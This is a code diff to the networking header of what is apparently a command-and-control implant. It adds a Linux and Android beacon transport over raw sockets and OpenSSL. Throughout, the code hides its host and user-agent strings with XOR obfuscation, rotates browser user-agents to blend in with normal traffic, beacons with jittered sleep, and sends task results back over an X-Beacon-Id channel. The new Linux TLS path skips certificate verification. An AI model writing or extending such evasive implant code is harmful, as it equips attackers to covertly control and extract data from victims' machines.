@@ -14,10 +14,21 @@
     #include <windows.h>
     #include <winhttp.h>
     #pragma comment(lib, "winhttp.lib")
-#else
+#elif defined(__APPLE__)
     #include <curl/curl.h>
     #include <string.h>
     #include <algorithm>
+#else
+    // Linux + Android: raw sockets + OpenSSL (no libcurl dependency)
+    #include <string.h>
+    #include <algorithm>
+    #include <sys/socket.h>
+    #include <netinet/in.h>
+    #include <arpa/inet.h>
+    #include <netdb.h>
+    #include <unistd.h>
+    #include <openssl/ssl.h>
+    #include <openssl/err.h>
 #endif
 #include <string>
 #include <cstdlib>
@@ -30,6 +41,7 @@ namespace net {
 
 struct C2Config;
 
+#ifdef _WIN32
 // ── WinHTTP Connection State ──────────────────────────────────────────────
 // Encapsulated handles: no static globals, single inline instance.
 struct WinHttpContext {
@@ -41,27 +53,36 @@ struct WinHttpContext {
 };
 
 inline WinHttpContext g_ctx;
+#endif
 
 // ── Configuration ──────────────────────────────────────────────────────────
-// These will be patched at compile time or set via config.
-struct C2Config {
-    std::wstring host      = XOR_WDEC(XOR_WSTR(L"127.0.0.1")).c_str();
-    int          port      = 8443;
-    bool         use_https = true;
-    int          sleep_ms  = 5000;     // Base sleep interval (ms)
-    int          jitter    = 30;       // Jitter percentage (0-100)
-    std::string  beacon_id;            // Unique agent identifier
+#ifdef C2_USE_HTTPS
+static constexpr bool kUseHttps = C2_USE_HTTPS != 0;
+#else
+static constexpr bool kUseHttps = true;
+#endif
 
-    // Calculate actual sleep with jitter
+struct C2Config {
+#ifdef _WIN32
+    std::wstring host      = XOR_WDEC(XOR_WSTR(L"127.0.0.1")).c_str();
+#else
+    std::string  host      = XOR_DEC(XOR_STR("127.0.0.1")).c_str();
+#endif
+    int          port      = 8443;
+    bool         use_https = kUseHttps;
+    int          sleep_ms  = 5000;
+    int          jitter    = 30;
+    std::string  beacon_id;
+
     int get_sleep_ms() const {
         if (jitter <= 0) return sleep_ms;
         int variation = (sleep_ms * jitter) / 100;
-        // Simple random without pulling in <random> (lighter binary)
         int offset = (rand() % (2 * variation + 1)) - variation;
-        return std::max(1000, sleep_ms + offset);  // Minimum 1 second
+        return std::max(1000, sleep_ms + offset);
     }
 };
 
+#ifdef _WIN32
 inline std::wstring get_random_ua();
 
 inline bool WinHttpContext::ensure(const C2Config& cfg) {
@@ -94,7 +115,6 @@ inline bool WinHttpContext::ensure(const C2Config& cfg) {
 // ── User-Agent Rotation ────────────────────────────────────────────────────
 // Rotate through common browser user-agents to blend in with normal traffic.
 
-#ifdef _WIN32
 inline std::wstring get_random_ua() {
     int r = rand() % 3;
     if (r == 0) {
@@ -216,7 +236,8 @@ bResult = WinHttpReceiveResponse(hRequest, nullptr);
     WinHttpCloseHandle(hRequest);
     return response_body;
 }
-#else
+#elif defined(__APPLE__)
+// ── macOS (libcurl) —────────────────────────────────────────────────────────
 inline std::string get_random_ua() {
     int r = rand() % 3;
     if (r == 0) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")).c_str();
@@ -259,7 +280,6 @@ inline std::string http_request(
         curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method_narrow.c_str());
     }
 
-    // Explicit timeout: 5 seconds for connection, 10 seconds total
     curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
 
@@ -277,7 +297,6 @@ inline std::string http_request(
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
 
     if (cfg.use_https) {
-        // Enforce SSL verification (removed bypass)
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
     }
@@ -286,6 +305,95 @@ inline std::string http_request(
     curl_slist_free_all(headers);
     curl_easy_cleanup(curl);
 
+    return response_body;
+}
+#else
+// ── Linux + Android (raw sockets + OpenSSL) ────────────────────────────────
+inline std::string get_random_ua() {
+    int r = rand() % 3;
+    if (r == 0) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")).c_str();
+    if (r == 1) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")).c_str();
+    return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")).c_str();
+}
+
+inline std::string http_request(
+    const C2Config& cfg,
+    const std::wstring& method,
+    const std::wstring& path,
+    const std::string& body = "",
+    const std::string& beacon_id = ""
+) {
+    std::string response_body;
+    std::string host_narrow(cfg.host.begin(), cfg.host.end());
+    std::string path_narrow(path.begin(), path.end());
+    std::string method_narrow(method.begin(), method.end());
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return "";
+
+    struct hostent *server = gethostbyname(host_narrow.c_str());
+    if (!server) { close(sock); return ""; }
+
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
+    addr.sin_port = htons(static_cast<uint16_t>(cfg.port));
+
+    SSL_CTX *ssl_ctx = nullptr;
+    SSL *ssl = nullptr;
+    if (cfg.use_https) {
+        SSL_load_error_strings();
+        OpenSSL_add_all_algorithms();
+        ssl_ctx = SSL_CTX_new(SSLv23_client_method());
+        if (ssl_ctx) {
+            ssl = SSL_new(ssl_ctx);
+            SSL_set_fd(ssl, sock);
+        }
+    }
+
+    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        if (ssl) SSL_free(ssl);
+        if (ssl_ctx) SSL_CTX_free(ssl_ctx);
+        close(sock);
+        return "";
+    }
+
+    if (ssl && SSL_connect(ssl) <= 0) {
+        SSL_free(ssl); SSL_CTX_free(ssl_ctx); close(sock);
+        return "";
+    }
+
+    std::string req = method_narrow + " " + path_narrow + " HTTP/1.1\r\n"
+        + "Host: " + host_narrow + ":" + std::to_string(cfg.port) + "\r\n"
+        + "User-Agent: " + get_random_ua() + "\r\n"
+        + "Content-Type: text/plain\r\n";
+    if (!beacon_id.empty())
+        req += "X-Beacon-Id: " + beacon_id + "\r\n";
+    if (!body.empty())
+        req += "Content-Length: " + std::to_string(body.size()) + "\r\n";
+    req += "Connection: close\r\n\r\n";
+    if (!body.empty())
+        req += body;
+
+    if (ssl) {
+        SSL_write(ssl, req.data(), static_cast<int>(req.size()));
+    } else {
+        send(sock, req.data(), static_cast<int>(req.size()), 0);
+    }
+
+    char buf[4096];
+    int n;
+    while ((n = ssl ? SSL_read(ssl, buf, sizeof(buf)) : static_cast<int>(recv(sock, buf, sizeof(buf), 0))) > 0) {
+        response_body.append(buf, static_cast<size_t>(n));
+    }
+
+    size_t hdr_end = response_body.find("\r\n\r\n");
+    if (hdr_end != std::string::npos)
+        response_body = response_body.substr(hdr_end + 4);
+
+    if (ssl) { SSL_free(ssl); SSL_CTX_free(ssl_ctx); }
+    close(sock);
     return response_body;
 }
 #endif
@@ -351,6 +459,7 @@ inline bool send_result(const C2Config& cfg, const std::string& task_id, const s
     return !resp.empty();
 }
 
+#ifdef _WIN32
 inline void cleanup() {
     g_ctx.cleanup();
 }
@@ -359,5 +468,6 @@ inline void WinHttpContext::cleanup() {
     if (hConnect) { WinHttpCloseHandle(hConnect); hConnect = nullptr; }
     if (hSession) { WinHttpCloseHandle(hSession); hSession = nullptr; }
 }
+#endif
 
 }  // namespace net
